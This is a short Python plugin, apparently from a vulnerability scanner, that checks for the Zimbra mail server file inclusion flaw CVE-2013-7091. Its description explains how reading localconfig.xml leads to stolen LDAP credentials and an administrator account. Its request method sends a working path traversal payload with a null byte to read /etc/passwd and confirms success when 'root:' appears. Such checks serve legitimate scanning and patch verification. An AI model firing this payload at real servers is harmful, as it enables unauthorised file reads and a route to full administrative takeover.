# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Zimbra邮件系统文件包含漏洞",
        "description": "Zimbra是一款专业的企业级邮件系统。Zimbra邮件系统存在文件包含漏洞。文件包含存在于/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx TemplateMsg.js.zgz中，利用该漏洞攻击者可以查看本地配置文件localconfig.xml的信息，包括LDAP协议授权的根目录，可以通过窃取的LDAP信任请求/service/admin/soap API，创建具有管理员权限的用户，从而获得管理控制权。",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2013-7091",
            "https://www.exploit-db.com/exploits/30085",
            "https://www.exploit-db.com/exploits/30472"
        ]
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path='./res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00',
            timeout=15,
            follow_redirects=False,
        )
        if r.status_code == 200 and 'root:' in r.text:
            return {"LoopholeInfo": self.__info__}
